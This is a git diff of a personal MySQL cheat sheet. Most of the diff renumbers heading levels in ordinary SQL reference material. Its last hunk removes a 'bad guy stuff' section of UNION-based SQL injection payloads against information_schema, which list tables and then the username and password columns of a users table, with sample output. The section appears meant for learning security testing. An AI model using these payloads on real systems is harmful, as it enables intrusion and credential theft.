@@ -4,9 +4,8 @@ Dummy data: https://github.com/justin-p/PowerShell/blob/master/random_sql_data.m
 
 Sources: https://raw.githubusercontent.com/rstacruz/cheatsheets/master/mysql.md
 
-## 'good guy' stuff
 
-### Create / Delete Database
+## Create / Delete Database
 
 ```sql
 CREATE DATABASE dbNameYouWant
@@ -15,26 +14,26 @@ DROP DATABASE dbNameYouWant
 ALTER DATABASE dbNameYouWant CHARACTER SET utf8
 ```
 
-### Backup Database to SQL File
+## Backup Database to SQL File
 
 ```bash
 mysqldump -u Username -p dbNameYouWant > databasename_backup.sql
 ```
 
-### Restore from backup SQL File
+## Restore from backup SQL File
 
 ```bash
 mysql - u Username -p dbNameYouWant < databasename_backup.sql
 ```
 
-### Repair Tables After Unclean Shutdown
+## Repair Tables After Unclean Shutdown
 
 ```bash
 mysqlcheck --all-databases
 mysqlcheck --all-databases --fast
 ```
 
-### Browsing
+## Browsing
 
 ```sql
 SHOW DATABASES
@@ -45,13 +44,13 @@ SHOW PROCESSLIST
 KILL process_number
 ```
 
-### Insert
+## Insert
 
 ```sql
 INSERT INTO table1 (field1, field2, ...) VALUES (value1, value2, ...)
 ```
 
-### Delete
+## Delete
 
 ```sql
 DELETE FROM table1 / TRUNCATE table1
@@ -60,10 +59,10 @@ DELETE FROM table1, table2 FROM table1, table2 WHERE table1.id1 =
   table2.id2 AND condition
 ```
 
-### Update
+## Update
 UPDATE scores SET score=25 WHERE student_id=4 AND test_id=4;
 
-### SELECT
+## SELECT
 
 ```sql
 select * from absence;
@@ -92,7 +91,7 @@ SELECT DISTINCT field1 FROM ...
 SELECT DISTINCT field1, field2 FROM ...
 ```
 
-### RENAME
+## RENAME
 
 ```sql
 show tables;
@@ -124,7 +123,7 @@ show tables;
 ```
 
 
-### Conditions
+## Conditions
 
 ```sql
 field1 = value1
@@ -139,7 +138,7 @@ condition1 OR condition2
 ```
 
 
-### WHERE
+## WHERE
 
 ```sql
 select first_name, last_name, state from students where sex="F";
@@ -165,7 +164,7 @@ select first_name, last_name, state from students where sex="F";
 15 rows in set (0.00 sec)
 ```
 
-### WHERE eg,lt,gt,ge,le,ne
+## WHERE eg,lt,gt,ge,le,ne
 
 ```sql
 eq =
@@ -195,7 +194,7 @@ SELECT first_name, last_name, birth_date FROM students WHERE YEAR(birth_date) >=
 ```
 
 
-### OR, AND NOT
+## OR, AND NOT
 
 ```sql
 OR  ||  
@@ -232,7 +231,7 @@ SELECT first_name, last_name, birth_date,state FROM students WHERE day(birth_dat
 ```
 
 
-### NOT NULL
+## NOT NULL
 
 select all last_name from students where a value is been supplied. Do not show null data.
 ```sql
@@ -269,7 +268,7 @@ SELECT last_name FROM students WHERE last_name IS NOT NULL;
 25 rows in set (0.01 sec)
 ```
 
-### ORDER BY
+## ORDER BY
 
 order the select by last_name
 
@@ -307,7 +306,7 @@ select first_name, last_name FROM students ORDER BY last_name;
 25 rows in set (0.00 sec)
 ```
 
-### order DESC
+## order DESC
 
 order the select by last_name but in descending order.
 
@@ -345,7 +344,7 @@ select first_name, last_name FROM students ORDER BY last_name DESC;
 25 rows in set (0.00 sec)
 ```
 
-### ORDER BY (multi)
+## ORDER BY (multi)
 
 order by multiple values.
 
@@ -383,7 +382,7 @@ SELECT first_name, last_name, state FROM students ORDER BY state DESC, last_name
 25 rows in set (0.00 sec)
 ```
 
-### LIMIT
+## LIMIT
 
 limit the select to 5 values.
 
@@ -429,7 +428,7 @@ select student_id,first_name, last_name FROM students LIMIT 5, 1;
 1 row in set (0.00 sec)
 ```
 
-### CONCAT && AS
+## CONCAT && AS
 
 CONCAT can be used to 'merge' 2 things into something custom
 AS can be used to rename something.
@@ -468,7 +467,7 @@ SELECT CONCAT(first_name, " ", last_name) AS 'Name',Sex AS 'Gender',"Ow Hi there
 
 ```
 
-### LIKE
+## LIKE
 
 ```sql
 % = wildcard
@@ -527,7 +526,7 @@ SELECT last_name, first_name FROM students WHERE first_name LIKE '___e%';
 7 rows in set (0.00 sec)
 ```
 
-### DISTINCT 
+## DISTINCT 
 
 only show unique values 
 
@@ -542,7 +541,7 @@ SELECT DISTINCT type FROM tests ORDER BY type;
 2 rows in set (0.01 sec)
 ```
 
-### COUNT
+## COUNT
 
 Count something
 
@@ -585,7 +584,7 @@ SELECT sex, COUNT(*) AS GenderCount FROM students GROUP BY sex;
 ```
 
 
-### GROUP BY
+## GROUP BY
 
 count the students that are born on the same month, then GROUP and ORDER by month.
 
@@ -626,7 +625,7 @@ select Month(birth_date) AS 'Month', Count(student_id) AS Students FROM students
 
 ```
 
-### HAVING
+## HAVING
 
 > Difference between the having and where clause in sql is that the where clause can not be used with aggregates, but the having clause can. One way to think of it is that the having clause is an additional filter to the where clause.
 > https://stackoverflow.com/questions/16155937/mysql-having-vs-where
@@ -647,7 +646,7 @@ select sex, COUNT(sex) AS 'Amount' FROM students GROUP BY sex HAVING Amount > 10
 ```
 
 
-### MATH stuff
+## MATH stuff
 
 ```sql
 SELECT test_id AS 'Test', 
@@ -675,7 +674,7 @@ FROM scores GROUP BY test_id;
 10 rows in set (0.00 sec)
 ```
 
-### BETWEEN
+## BETWEEN
 
 ```sql
 SELECT first_name, last_name, birth_date FROM students WHERE birth_date BETWEEN '1997-1-1' AND '1995-1-1';
@@ -695,7 +694,7 @@ SELECT first_name, last_name, birth_date FROM students WHERE birth_date BETWEEN 
 6 rows in set (0.00 sec)
 ```
 
-### IN
+## IN
 
 match for 'array' (list) of vales.
 can also be used on subquerys
@@ -713,9 +712,9 @@ SELECT first_name, last_name FROM students WHERE last_name IN ('Cooper','Sanders
 
 ```
 
-### Join
+## Join
 
-### Select - Join
+## Select - Join
 
 ```sql
 SELECT ... FROM t1 JOIN t2 ON t1.id1 = t2.id2 WHERE condition
@@ -810,7 +809,7 @@ WHERE students.student_id = absences.student_id
 GROUP BY students.student_id;
 ```
 
-### LEFT JOIN
+## LEFT JOIN
 
 ```sql
 SELECT students.student_id,
@@ -821,7 +820,7 @@ ON students.student_id = absences.student_id
 GROUP BY students.student_id;
 ```
 
-### INNER JOIN
+## INNER JOIN
 
 ```SQL
 SELECT students.first_name,
@@ -835,9 +834,9 @@ WHERE scores.score <= 15
 ORDER BY scores.test_id;
 ```
 
-### Create / Delete / Modify Table
+## Create / Delete / Modify Table
 
-#### Create
+### Create
 
 ```sql
 CREATE TABLE table (field1 type1, field2 type2, ...)
@@ -866,7 +865,7 @@ CREATE TABLE table IF NOT EXISTS (...)
 CREATE TEMPORARY TABLE table (...)
 ```
 
-#### Drop
+### Drop
 
 ```sql
 DROP TABLE table
@@ -874,7 +873,7 @@ DROP TABLE IF EXISTS table
 DROP TABLE table1, table2, ...
 ```
 
-#### Alter
+### Alter
 
 ```sql
 ALTER TABLE table MODIFY field1 type1
@@ -890,7 +889,7 @@ ALTER TABLE table DROP field1
 ALTER TABLE table ADD INDEX (field);
 ```
 
-#### Change field order
+### Change field order
 
 ```sql
 ALTER TABLE table MODIFY field1 type1 FIRST
@@ -900,7 +899,7 @@ ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1 AFTER
   another_field
 ```
 
-### Keys
+## Keys
 
 ```sql
 CREATE TABLE table (..., PRIMARY KEY (field1, field2))
@@ -908,7 +907,7 @@ CREATE TABLE table (..., FOREIGN KEY (field1, field2) REFERENCES table2
 (t2_field1, t2_field2))
 ```
 
-### Users and Privileges
+## Users and Privileges
 
 ```sql
 GRANT ALL PRIVILEGES ON base.* TO 'user'@'localhost' IDENTIFIED BY 'password';
@@ -929,7 +928,7 @@ DROP USER 'user'@'host'
 
 Host ‘%’ indicates any host.
 
-### Main Data Types
+## Main Data Types
 
 ```sql
 TINYINT (1o: -217+128)
@@ -973,7 +972,7 @@ Variants for TEXT&BLOB: `TINY` (max=255), `MEDIUM` (max=~16000), and `LONG` (max
 ENUM ('value1', 'value2', ...) -- (default NULL, or '' if NOT NULL)
 ```
 
-### Reset Root Password
+## Reset Root Password
 
 ```bash
 $ /etc/init.d/mysql stop
@@ -991,120 +990,4 @@ mysql> UPDATE mysql.user SET password=PASSWORD('new_pass') WHERE user='root';
 ```bash
 ## Switch back to the mysqld_safe terminal and kill the process using Control + \
 $ /etc/init.d/mysql start
-```
-
-
-## 'bad guy' stuff
-
-### External stuff
-
-https://www.exploit-db.com/papers/13045/
-
-### My own stuff
-
-#### char tables
-
-https://github.com/justin-p/sec-stuff/blob/master/general%20info/ascii-table.md   
-
-
-#### Always True
-
-```
-1=1
-a=a
-```
-
-#### Escape/stop
-
-```sql
-# 
--- 
-#--
-```
-
-#### MySQL Verison
-
-select version()
-
-#### information Schema
-
-##### Table names
-
-SELECT table_schema,table_name FROM information_Schema.tables
-
-SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables
-
-SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables
-
-###### Injection example 1
-
-```sql
-' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #--
-``` 
-
-```text
-dummymalex:dummyms 
-```
-
-```text
-table_schema = dummymalex
-table_name  = dummyms
-```
-
-###### Hide stuff we dont need
-
-AND table_schema != 'information_schema'
-
-###### Injection example 2
-
-```sql
-' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 AND table_schema != 'information_schema' ORDER BY table_name LIMIT 0,1) #--
-```
-```
-LIMIT 0,1
-dummymalex:dummyms 
-```
-
-```
-table_schema = dummymalex
-table_name   = dummyms 
-```
-
-```	
-LIMIT 1,1 
-dummymalex:users 	
-```
-
-```
-table_schema = dummymalex
-table_name   = users
-```
-
-
-##### column_name
-
-SELECT column_schema,column_name FROM information_Schema.columns
-
-###### Injection Example 1
-
-```
-' union (select CONCAT(column_name) from information_Schema.columns where table_name='dummyms' LIMIT 0,1) #--
-LIMIT 0,1
-	ID
-LIMIT 1,1
-	dummyms
-LIMIT 2,1
-	description
-```
-
-###### Injection Example 2
-
-```
-' union (select CONCAT(column_name) from information_Schema.columns where table_name='users' LIMIT 0,1) #--
-LIMIT 0,1
-	ID
-LIMIT 1,1
-	username
-LIMIT 2,1
-	password
 ```
